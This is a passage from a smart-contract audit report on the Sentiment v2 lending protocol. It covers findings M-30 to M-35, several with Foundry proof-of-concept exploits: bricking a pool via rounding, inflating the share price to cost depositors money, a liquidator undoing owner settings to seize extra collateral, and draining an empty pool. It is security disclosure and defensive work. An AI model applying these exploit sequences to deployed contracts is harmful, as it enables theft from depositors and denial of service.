        assets[0] = asset1Data;

        vm.startPrank(liquidator);
        asset1.mint(liquidator, 2e18);
        asset1.approve(address(positionManager), 2e18);
        positionManager.liquidate(position, debts, assets);
        vm.stopPrank();
    }
```

## Tool used

Manual Review

## Recommendation

- To maintain the concept of isolated financial risk in base pools, a position's health can be considered at the 'position level', but in the liquidation flow, collateral could be weighted to pools based on the level of debt in each pool.
  
- For example, taking the example from the POC above, after fixedRatePool changed the LTV setting from 70% to 60%, the position became unhealthy as the minReqAssetValue of 3.094571e18 exceeded the deposited collateral worth 3e18. 
- The minReqCollateral was calculated in each iteration of the loop in `RiskModule::_getMinReqAssetValue()`, and we saw in the POC that the contribution required from linearRatePool was 1.4285e18 and the contribution required from fixedRatePool was 1.666e18.
- If we apportion the deposited collateral based on the size of debt in each pool we would apportion 1.5e18 value of collateral to each debt (because the value of each debt was equal), this would show:
  - The position is within linearRatePool's risk tolerance because 1.5e18 > 1.4285e18
  - The position is not within fixedRatePool's risk tolerance because 1.5e18 < 1.666e18
- So I recommend we allow the liquidation of debt from fixedRatePool but not linearRatePool. This makes sense as fixedRatePool was the pool who opted for a riskier LTV.
- This solution is consistent with the idea of isolated pool risk settings and a trustless model between the owners of base pools

# Issue M-30: Base pools can get bricked if depositors pull out 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/400 

## Found by 
000000, A2-security, ThePharmacist
### Summary

In case depositors pull their funds out of the pool, due to rounding, there can be `TotalDepositAssets > 0` while `TotalDepositShares == 0`. This would completely brick the `deposit` function of the pool and the pool would not be functional anymore. This can lead to attackers being able to disable a pool since the start of it's initialization.

### Root Cause

in [`withdraw:350`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L350), the `asset` to `share` conversion is rounded up. This can allow the subtraction in [`withdraw:364`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L364-L365) to reduce the `share` amount to zero while `assets` can stay more than zero.

This state causes every [`convertToShares`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L275-L283) to lead to zero for deposit assets, hence, bricking the [`deposit`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L309-L331) function with the error `Pool_ZeroSharesDeposit`.

### Internal pre-conditions

1. No other depositors should be present in the pool
2. At least one accrual should have happened so that `totalDepositAssets` > `totalDepositShares`

### External pre-conditions

N/A

### Attack Path

1. An attacker sees a pool initialization in the mempool
2. Attacker initializes the pool herself so that the other transaction from the victim fails. (in case it is trying to deposit right after initialization)
3. The attacker deposits some amount in the pool right after initialization
4. In the next block, attacker takes all the deposit assets out and leaves only `1` in
5. Now the `TotalDepositAssets == 1 && TotalDepositShares == 0` holds true
6. The pool is bricked

### Impact

- Since the initialized pools for each address are limited and can be triggered by anyone:
```solidity
poolId = uint256(keccak256(abi.encodePacked(owner, asset, rateModelKey)));
```
Attacker can create all the possible pools for a certain address and brick them all. This stops the target address from creating any more pools. However, new pools can be created from other addresses and be transferred too the victim. This bug can break certain usecases and allow adversaries to target certain users/protocol and launch DoS against them.
- No loss of funds happen since this situation only happens if there are 0 depositors in the pool, which means 0 borrowers.

### PoC

The log outputs for the PoC below:
```solidity
  Total Deposit Assets 0
  Total Deposit Shares 0
  Attacker borrows 0
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 0
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 10000000000000000000
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 10000003992699064570
  ================================
  Total Deposit Assets 200000003992699064570
  Total Deposit Shares 200000000000000000000
  Attacker borrows 0
  ================================
  Total Deposit Assets 1
  Total Deposit Shares 0
  Attacker borrows 0
  ================================
```

Which shows the final `Total Deposit Assets 1` and `Total Deposit Shares 0` which bricks the victim pool.

```solidity
function testCanBrickPool() public {
        address attacker = makeAddr("Attacker");
        address victim = makeAddr("Victim");

        MockERC20 borrowAsset = asset1;
        MockERC20 collateralAsset = asset2;
        uint256 amountOfAsset = 1_000 ether;
        uint256 vicPoolId;
        address attPosition;
        bytes memory data;
        Action memory action;

        /**
        * =============================
        *           SETUP
        * =============================
         */
        {
            // == Minting assets to actors
            borrowAsset.mint(attacker, amountOfAsset);
            collateralAsset.mint(attacker, amountOfAsset);

            borrowAsset.mint(victim, amountOfAsset);
            collateralAsset.mint(victim, amountOfAsset);
            // == Finish minting assets

            // == Making the position
            vm.startPrank(attacker);
            bytes32 salt = bytes32(uint256(98));
            address owner = attacker;
            data = abi.encodePacked(owner, salt);
            (attPosition,) = protocol.portfolioLens().predictAddress(owner, salt);
            action = Action({ op: Operation.NewPosition, data: data });
            positionManager.process(attPosition, action);
            vm.stopPrank();

            vm.startPrank(positionManager.owner());
            positionManager.toggleKnownAsset(address(borrowAsset));
            // positionManager.toggleKnownAsset(address(collateralAsset)); // Already a known asset
            vm.stopPrank();
            // == Finish making the position

            // == Victim making the pool
            // // ==== Setting the rateModel
            address rateModel = address(new LinearRateModel(1e18, 2e18));
            bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
            vm.prank(protocolOwner);
            registry.setRateModel(RATE_MODEL_KEY, rateModel);
            // // ==== Finished Setting the rate model
            vm.startPrank(victim);
            vicPoolId = pool.initializePool(
                victim, // owner
                address(borrowAsset), // asset to use
                1e30, // pool cap
                RATE_MODEL_KEY // rate model key in registry
                );
            // // ==== Setting the LTV
            riskEngine.requestLtvUpdate(vicPoolId, address(collateralAsset), 0.8e18); // Using the same asset to borrow one in this case
            riskEngine.acceptLtvUpdate(vicPoolId, address(collateralAsset));
            // // ==== Finish setting the LTv
            vm.stopPrank();
            // == Finished making the pool

            // == Attacker setting up the position
            vm.startPrank(attacker);
            data = abi.encodePacked(address(collateralAsset));
            action = Action({ op: Operation.AddToken, data: data });
            positionManager.process(
                attPosition,
                action
            );
            collateralAsset.transfer(address(attPosition), amountOfAsset/2);
            vm.stopPrank();
            // == Finish Attacker setting up the position
        }

        /**
        * =============================
        *           EXPLOIT
        * =============================
         */

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        pool.deposit(vicPoolId, amountOfAsset/5, attacker);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, amountOfAsset/100);
        action = Action({ op: Operation.Borrow, data: data });
        positionManager.process(
            attPosition,
            action
        );
        borrowAsset.transfer(attPosition, amountOfAsset/50);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.warp(block.timestamp + 12);

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, type(uint256).max);
        action = Action({ op: Operation.Repay, data: data });
        positionManager.process(
            attPosition,
            action
        );
        vm.stopPrank(); 

        logPoolData(vicPoolId, attPosition);
        
        vm.startPrank(attacker);
        (,,,,,,,,,uint256 totalDepositAssets,) = pool.poolDataFor(vicPoolId);
        pool.withdraw(vicPoolId, totalDepositAssets - 1, attacker, attacker); // 1 asset remaining with 0 shares, amountOfAsset = 1_000 ether
        vm.stopPrank(); 

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        vm.expectRevert(); // pool is bricked!
        pool.deposit(vicPoolId, amountOfAsset/5, attacker);
        vm.stopPrank();
    }
    function logPoolData(uint256 poolId, address attacker) view public {
        (,,,,,,,,,uint256 totalDepositAssets, uint256 totalDepositShares) = pool.poolDataFor(poolId);
        console2.log("Total Deposit Assets", totalDepositAssets);
        console2.log("Total Deposit Shares", totalDepositShares);
        console2.log("Attacker borrows", pool.getBorrowsOf(poolId, attacker));
        console2.log("================================");
    }
```

### Mitigation

The protocol should check and only allow state transitions that make `assets` or `shares` 0 only if the other one is also 0.

# Issue M-31: Share inflation on base pools can cause heavy losses to users 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/427 

## Found by 
HHK, Obsidian, ThePharmacist, Tomas0707, smbv-1923, vatsal
### Summary

Users can deposit and borrow from pools in Sentiment v2 which calculates each user's balance through an Asset and Share system. By it's nature, Assets are supposed to always grow (in case there are no bad debts), and therefore are larger in value than shares. However, malicious users can heavily inflate each share, and can cause miscalculations due to rounding errors. This would effect pools with less underlying decimal asset in a way that 1- The fee paid to the pool can br bricked easily 2- the users that deposit can lose money due to loss of precision.

### Root Cause

- In [`Pool:381`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383), and [`FixedRateModel.sol:33`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/irm/FixedRateModel.sol#L33) the accrual is always rounded up.
- In the documentation, it is said that `Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000`. While this attack is possible for all `minDebts` in this range, we will consider that `Min Debt = 0` to explore the most extreme case. Consider that by increasing the amount of `MinDebt` this attack would be much less feasible.
- In [`Pool.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381), the value `interestAccrued` is in base asset's decimals, which means for USDC/USDT, this amount would be only 6 decimals. This makes the share inflation attack way more feasible on such low decimal tokens.

### Internal pre-conditions

N/A

### External pre-conditions

1- since the inflation happens through accruals in each block, the attacker should not be interrupted during the process. In case of interruptions, attacker can start to work on a new pool.

### Attack Path

The goal of the Attacker is to inflate each share and map each 1 share to a much higher amount of Asset.
Here, we consider that the attacker is not going to be interrupted during the process, and also consider `minDebt == 0`.
1- The attacker deposits 1 asset into the protocol, bringing `totalDepositAssets` and `totalDepositShares` both to 1.
2- The attacker borrows the 1 asset from the protocol, bringing `totalBorrowAssets` and `totalBorrowShares` both to 1, also setting the utilization to 100 percent.
3- attacker starts accruing with each block, after the first accrual, [`Pool:407`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L407-L409) adds to the Assets, inflating them in the process. `feeShares` is usually zero due to rounding down and small amounts in the process.
4- After the first accrual, `totalDepositAssets` and `totalBorrowAssets` are set to 2, while the shares remain in the previous value.
5- Attacker can continue and do this for a day, after `(24*3600)/12 = 7200 times`, can bring asset/share to `7201`.
6- After the second day and `14400` times of accrual, bringing asset/share ratio to `14400`. (Attacker can get achieve bigger numbers if they continue doing this)
7- At this point, every deposit or borrow from users would be rounded down/up by 14400. A victim can deposit `14400 * 2 - 1` assets and would only receive 1 share, basically sharing `14400 - 1` with the rest of the pool. 
8 - This would especially effect the pools with less decimal values such as `USDC` and `USDT`.

### Impact

- Fees to the protocol will shutdown after a certain ratio is reached. Since [`interestAccrued`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383) is small each time and protocol [fees are rounded down twice](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L387-L395), protocol lenders can use such tricks and accrue frequently to avoid paying any fees to the protocol owner.
- The share inflation can cause loss of funds to both lenders and borrowers, and a malicious user with correct inputs that do not lose value due to precision loss can steal funds from other people in such systems.
- The internal bookkeeping of the protocol would be incorrect.

### PoC

The output of the test is:
```text
  ================
  One day of constant accrual
  Total Borrow Assets:  7201
  Total Borrow Shares:  1
  Total Deposit Assets:  7201
  Total Deposit Shares:  1
  ================
  Two days of constant accrual
  Total Borrow Assets:  14401
  Total Borrow Shares:  1
  Total Deposit Assets:  14401
  Total Deposit Shares:  1
  ================
  Total Borrow Assets:  14401
  Total Borrow Shares:  1
  Total Deposit Assets:  43202
  Total Deposit Shares:  2
  ================
```
PoC:
```solidity
   function testInflateShares() public {
        address attacker = makeAddr("Attacker");
        address victim = makeAddr("Victim");
        address liquidator = makeAddr("Liquidator");

        vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset3Oracle)); // 1:1 with Eth
        riskEngine.setOracle(address(asset2), address(asset3Oracle)); // 1:1 with Eth
        vm.stopPrank();

        MockERC20 borrowAsset = asset1; 
        MockERC20 collateralAsset = asset2;
        uint256 amountOfAsset = 1_000 ether;
        uint256 vicPoolId;
        address attPosition;
        bytes memory data;
        Action memory action;

        /**
        * =============================
        *           SETUP
        * =============================
         */
        {
            // == Minting assets to actors
            borrowAsset.mint(attacker, amountOfAsset);
            collateralAsset.mint(attacker, amountOfAsset);

            borrowAsset.mint(victim, amountOfAsset);
            collateralAsset.mint(victim, amountOfAsset);

            borrowAsset.mint(liquidator, amountOfAsset);
            // == Finish minting assets

            // == Making the position
            vm.startPrank(attacker);
            bytes32 salt = bytes32(uint256(98));
            address owner = attacker;
            data = abi.encodePacked(owner, salt);
            (attPosition,) = protocol.portfolioLens().predictAddress(owner, salt);
            action = Action({ op: Operation.NewPosition, data: data });
            positionManager.process(attPosition, action);
            vm.stopPrank();

            vm.startPrank(positionManager.owner());
            positionManager.toggleKnownAsset(address(borrowAsset));
            // positionManager.toggleKnownAsset(address(collateralAsset)); // Already a known asset
            vm.stopPrank();
            // == Finish making the position

            // == victim making the pool
            // // ==== Setting the rateModel
            address rateModel = address(new LinearRateModel(1e18, 2e18));
            bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
            vm.prank(protocolOwner);
            registry.setRateModel(RATE_MODEL_KEY, rateModel);
            // // ==== Finished Setting the rate model
            vm.startPrank(victim);
            vicPoolId = pool.initializePool(
                victim, // owner
                address(borrowAsset), // asset to use
                1e30, // pool cap
                RATE_MODEL_KEY // rate model key in registry
                );
            // // ==== Setting the LTV
            riskEngine.requestLtvUpdate(vicPoolId, address(collateralAsset), 0.95e18); // Using the same asset to borrow one in this case
            riskEngine.acceptLtvUpdate(vicPoolId, address(collateralAsset));
            // // ==== Finish setting the LTv
            vm.stopPrank();
            // == Finished making the pool

            // == Attacker setting up the position
            vm.startPrank(attacker);
            data = abi.encodePacked(address(collateralAsset));
            action = Action({ op: Operation.AddToken, data: data });
            positionManager.process(
                attPosition,
                action
            );
            collateralAsset.transfer(address(attPosition), amountOfAsset/2);
            vm.stopPrank();
            // == Finish Attacker setting up the position
        }

        /**
        * =============================
        *           EXPLOIT
        * =============================
         */

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        pool.deposit(vicPoolId, 1, attacker);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, uint256(1));
        action = Action({ op: Operation.Borrow, data: data });
        positionManager.process(
            attPosition,
            action
        );
        borrowAsset.transfer(attPosition, amountOfAsset/50);
        vm.stopPrank();

        logPool(vicPoolId);
        for(uint i = 1; i <= 7200; i++){
            vm.warp(block.timestamp + 12);
            pool.accrue(vicPoolId);
        }
        console2.log("One day of constant accrual");
        logPool(vicPoolId);

        for(uint i = 1; i <= 7200; i++){
            vm.warp(block.timestamp + 12);
            pool.accrue(vicPoolId);
        }
        console2.log("Two days of constant accrual");
        logPool(vicPoolId);

        (,,,,,,,,, uint256 tDAssets,) = pool.poolDataFor(vicPoolId);
        vm.startPrank(victim);
        borrowAsset.approve(address(pool), type(uint256).max);
        collateralAsset.approve(address(pool), type(uint256).max);
        pool.deposit(vicPoolId, tDAssets * 2 - 1, victim);
        vm.stopPrank();

        logPool(vicPoolId);
    }

    function logPool(uint256 poolId) view public {
        (,,,,,,,uint256 tBAssets, uint256 tBShares, uint256 tDAssets, uint256 tDShares) = pool.poolDataFor(poolId);
        console2.log("Total Borrow Assets: ", tBAssets);
        console2.log("Total Borrow Shares: ", tBShares);
        console2.log("Total Deposit Assets: ", tDAssets);
        console2.log("Total Deposit Shares: ", tDShares);
        console2.log("================");
    } 
```

### Mitigation

- Increase the amount of `minDebt` to at least 0.05 ETH. Explore how the feasibility of this attack drops with the increase of `minDebt`.
- the `interestAccrued` should be normalized to the 18 decimals even for lower asset decimals, this makes the calculations for such assets much more accurate.

# Issue M-32: Faulty Fee Validation in `SuperPool::requestFeeUpdate()` Function Leads to Update Lockout 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/440 

## Found by 
0xAristos, 0xc0ffEE, Naresh, Rea, ThePharmacist, Yuriisereda, arcaneagent1001, parsely, serial-coder, theweb3mechanic
## Summary
The `SuperPool::requestFeeUpdate()` function is responsible for proposing new `fee` updates in the `SuperPool` contract, has a validation issue. The function incorrectly validates the current state variable `fee` instead of the new `_fee` parameter. This flawed logic causes the function to revert when the current `fee` exceeds 1e18, regardless of the `_fee` value. As a result, if the `fee` is ever set to a value greater than 1e18, no further `fee` updates can be proposed, leading to potential disruptions in the contract’s operations.

## Vulnerability Detail
The `SuperPool::requestFeeUpdate()` is used to propose a new `fee` update for the `SuperPool`. the current implementation of the `requestFeeUpdate()` function only checks the state variable `fee` and not the new parameter `_fee`. This check only considers the current state variable `fee`, not the `_fee` parameter. This means if the state variable fee is greater than 1e18, the function will revert regardless of the value of `_fee`.
 ```solidity
    function requestFeeUpdate(uint256 _fee) external onlyOwner {
@>     if (fee > 1e18) revert SuperPool_FeeTooHigh();
        pendingFeeUpdate = PendingFeeUpdate({ fee: _fee, validAfter: block.timestamp + TIMELOCK_DURATION });
        emit SuperPoolFeeUpdateRequested(_fee);
    }
```
Since the `requestFeeUpdate()` function only considers the current state variable `fee`, once it’s set to a value greater than 1e18, no new updates can be proposed. This means the contract will never allow a fee update to be requested, potentially breaking functionality that depends on the ability to update the fee.

<details><summary><strong>POC</strong></summary>
Extended from <a href="https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/test/core/Superpool.t.sol#L8" target="_blank">SuperPool.t.sol</a>

```solidity
    function testCannot_Change_Fee() public {
        
        uint256 fee = 0.01 ether;

        SuperPool superpool =
            new SuperPool(address(pool), address(asset1), feeTo, fee, 1_000_000 ether, "test", "test");

        // Update the fee to greater than 1e18
        superpool.requestFeeUpdate(1e19);

        vm.warp(block.timestamp + superpool.TIMELOCK_DURATION() + 2);
        superpool.acceptFeeUpdate();

        // Reverts once it is set to a value greater than 1e18, and no new updates can be proposed
        vm.expectRevert(SuperPool.SuperPool_FeeTooHigh.selector);
        superpool.requestFeeUpdate(0.01 ether);
        
     }
```
Run the following command to execute the POC: `forge test --match-test testCannot_Change_Fee`
</details>


## Impact
The inability to update the `fee` due to the incorrect validation in `requestFeeUpdate()` could lead to a breakdown in the contract’s intended operations, making the contract non-functional or less adaptable to future needs.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L366-L370

## Tool used
Manual Review

## Recommendation
Correct the validation in the `requestFeeUpdate()` function to check the `_fee` parameter:
```diff
    function requestFeeUpdate(uint256 _fee) external onlyOwner {
--      if (fee > 1e18) revert SuperPool_FeeTooHigh();
++      if (_fee > 1e18) revert SuperPool_FeeTooHigh();
        pendingFeeUpdate = PendingFeeUpdate({ fee: _fee, validAfter: block.timestamp + TIMELOCK_DURATION });
        emit SuperPoolFeeUpdateRequested(_fee);
    }
```

# Issue M-33: Liquidator can revert changes made during `RiskEngine::setRiskModule()` to use a higher liquidation discount. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/457 

## Found by 
phoenixv110, sl1
## Summary
Liquidator can rollback changes made in RiskEngine during the call to `setRiskModule()` function to use an old liquidation discount if it's higher than the new one.
## Vulnerability Detail
Position can be liquidated through invoking `liquidate()` function of the PositionManager.
[PositionManager.sol#L430-L435](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L430-L435)
```solidity
function liquidate(
    address position,
    DebtData[] calldata debtData,
    AssetData[] calldata assetData
) external nonReentrant {
    riskEngine.validateLiquidation(position, debtData, assetData);
```
As can be seen, `validateLiquidation()` is invoked on the RiskEngine, which calls `validateLiquidation()` on the underlying RiskModule set in the RiskEngine.
[RiskEngine.sol#L136-L142](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L136-L142)
```solidity
function validateLiquidation(
    address position,
    DebtData[] calldata debtData,
    AssetData[] calldata assetData
) external view {
    riskModule.validateLiquidation(position, debtData, assetData);
}
```
RiskModule ensures that the amount of assets seized does not exceed the maximum allowed amount determined by the RiskModule's liquidation discount. The higher the liquidation discount the more assets a liquidator can seize.
[RiskModule.sol#L111-L120](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L111-L120)
```solidity
function validateLiquidation(
    address position,
    DebtData[] calldata debtData,
    AssetData[] calldata assetData
) external view {
    // position must breach risk thresholds before liquidation
    if (isPositionHealthy(position))
        revert RiskModule_LiquidateHealthyPosition(position);
    _validateSeizedAssetValue(  <<@
        position,
        debtData,
        assetData,
        LIQUIDATION_DISCOUNT <<@
    );
}
```

There exist two ways in the RiskEngine to change the underlying RiskModule and subsequently the liquidation discount:
1. RiskModule can be changed in Registry and `RiskEngine::updateFromRegistry()` can be invoked to update the state of the RiskEngine.
2. The owner of the RiskEnginge can call `setRiskModule()` to update RiskEngine's underlying RiskModule without updating the value in the registry.

[RiskEngine.sol#L235-L239](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L235-L239)
```solidity
function setRiskModule(address _riskModule) external onlyOwner {
    riskModule = RiskModule(_riskModule);
    emit RiskModuleSet(_riskModule);
}
```

However, if the owner wishes to change the RiskModule only for a specific RiskEngine, without updating the value in the registry, those changes can be easily reverted by any of the users. This can be done because `updateFromRegistry()` function of the RiskEngine is not restricted and when calling it the RiskModule will be set to an old value stored in the registry.
[RiskEngine.sol#L114-L120](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L114-L120)
```solidity
function updateFromRegistry() external {
    pool = Pool(REGISTRY.addressFor(SENTIMENT_POOL_KEY));
    riskModule = RiskModule(REGISTRY.addressFor(SENTIMENT_RISK_MODULE_KEY));
    emit PoolSet(address(pool));
    emit RiskModuleSet(address(riskModule));
}
```

Imagine a scenario where the owner updates the RiskModule in the RiskEngine by calling `setRiskModule()` and changes the liquidation discount from 20% to 10%.
Bob wishes to liquidate a debt worth 100 ETH and he is allowed to seize `100 / (100% - 10%) = 111 ETH`.
[RiskModule.sol#L156](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L156)
```solidity
uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
```
Before calling `liquidate()` Bob calls `RiskEnginge::updateFromRegistry()`, which sets the RiskModule to the one stored in the registry with a liquidation discount of 20%. Because of that Bob now is allowed to seize `100 / (100% - 20%) = 125 ETH`.

The same issue is present in the PositionManager, where any user can easily revert changes made during a call to [setBeacon()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506).
## Impact
A malicious user can easily revert changes made by the owner and seize more assets than allowed.
## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L235-L239
## Tool used

Manual Review

## Recommendation
Restrict the `updateFromRegistry()` functions both in PositionManager and RiskEngine, so an owner will have an ability to selectively update `positionBeacon` and `riskModule` variables respectively without having to change their values in the registry.

# Issue M-34: `RedstoneOracle` priceTimestamp can be acurately determined , eliminating the need for a -3 mins worst case scenario 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/477 

## Found by 
Honour
### Summary

`RedstoneOracle` sets the `priceTimestamp` of a price feed update to `block.timestamp` - 3 mins. Assuming the worst case, `priceTimestamp` is 3 mins behind the actual timestamp of price update ,this 3 min lag is significant enough to dos the oracle when the price feed is not yet stale.

Especially when it is possible to retrieve the actual timestamp by overriding the `validateTimestamp` function.

### Root Cause

In `RedstoneOracle::updatePrice` it is assumed that the price timestamp of the price feed cannot be retrieved: 

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/oracle/RedstoneOracle.sol#L60

```solidity
 function updatePrice() external {
        // values[0] -> price of ASSET/USD
        // values[1] -> price of ETH/USD
        // values are scaled to 8 decimals
        uint256[] memory values = getOracleNumericValuesFromTxMsg(dataFeedIds);

        assetUsdPrice = values[0];
        ethUsdPrice = values[1];

        // RedstoneDefaultLibs.sol enforces that prices are not older than 3 mins. since it is not
        // possible to retrieve timestamps for individual prices being passed, we consider the worst
        // case and assume both prices are 3 mins old 
    ->  priceTimestamp = block.timestamp - THREE_MINUTES;
    }
```

However this is not correct as we see in the `getOracleNumericValuesFromTxMsg` function and from the redstone docs:

```solidity
  function getOracleNumericValuesFromTxMsg(bytes32[] memory dataFeedIds)
    internal
    view
    virtual
    returns (uint256[] memory)
  {
    (uint256[] memory values, uint256 timestamp) = _securelyExtractOracleValuesAndTimestampFromTxMsg(dataFeedIds);
->  validateTimestamp(timestamp);
    return values;
  }

/**
   * @dev This function may be overridden by the child consumer contract.
   * It should validate the timestamp against the current time (block.timestamp)
   * It should revert with a helpful message if the timestamp is not valid
   * @param receivedTimestampMilliseconds Timestamp extracted from calldata
   */
  function validateTimestamp(uint256 receivedTimestampMilliseconds) public view virtual {
    RedstoneDefaultsLib.validateTimestamp(receivedTimestampMilliseconds);
  }
```

The `validateTimestamp` function can be overridden. It's possible to retrieve the actual timestamp by overriding the `validateTimestamp` function and prevent any possible oracle DOS due to the time lag.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Possible Oracle DOS due to lagging priceTimestamp

### PoC

_No response_

### Mitigation

Override `validateTimestamp` to retrieve the actual timestamp, as an example:

```solidity
function validateTimestamp(uint256 timestamp) public view override {
  priceTimestamp = timestamp;
  super.validateTimestamp(timestamp);

}
```

# Issue M-35: The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/481 

## Found by 
goluu
## Summary
Empty pools' assets have been drained by the first depositor via inflating share prices.

## Vulnerability Detail

- **Empty Pool Condition:** The vulnerability occurs when the pool's total supply is zero.
- **Initial Deposit:** The attacker deposits 1000 wei worth of underlying assets. 
- **Borrowing:** The attacker borrows 1000 wei using the borrow function.
- **transfer amount** Position  manager mint  shares via transfer amount  
- **Partial Repayment:** Within the same block, the attacker repays 1000 wei. Due to rounding in favor of the protocol, total assets become 1001 wei, while the total supply remains 1000.
![image](https://github.com/user-attachments/assets/cb13b08c-8230-431f-bd15-edb89adad380)

- **Withdraw:** The attacker withdraws 999 wei, leaving the pool with a total supply of 1 and total assets of 2 wei.
![image](https://github.com/user-attachments/assets/7a4529d7-e948-446d-ab39-e8036323646e)

- **Inflation Attack:** The attacker repeatedly deposits and withdraws (total assets - 1) in the pool more than 80 times in a loop, leading to an inflated share price.

```solidity
 function testfirstdepositor() external {
    uint assets = 1000;
    vm.assume(assets > 0);
    vm.startPrank(user);

    asset1.mint(user, 1000e18);
    asset1.approve(address(pool), assets);

    pool.deposit(linearRatePool, 1000, user);
    assertEq(pool.getAssetsOf(linearRatePool, user), assets);
    assertEq(pool.balanceOf(user, linearRatePool), assets); // Shares equal 1:1 at first
    vm.stopPrank();

    vm.startPrank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
    pool.borrow(linearRatePool, user, assets);
    vm.warp(block.timestamp + 10);
    vm.roll(block.number + 1 );
    asset1.mint(address(pool),1001);
    pool.repay(linearRatePool, user, assets + 1);


    vm.stopPrank();
    vm.startPrank(user);
    pool.withdraw(linearRatePool, 999 , user, user);


    asset1.mint(user, assets);
    asset1.approve(address(pool), 1000e18);

    uint256 n = 60;
    for(uint8 i = 0; i < n; i++){
        uint256 amount = i ** 2 + 1;
        pool.deposit(linearRatePool, amount , user);
    
        pool.withdraw(linearRatePool, 1 ,user,user);
        (,,,,,,,,,uint256 totalDepositAssets,uint256 totalDepositShares) = pool.poolDataFor(linearRatePool);
        require (totalDepositShares == 1, "should be one ");



    }
 
 
 
```


## Impact

The first depositor loses their funds as the attacker manipulates the share price to drain the pool's assets.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L275

## Recommendation

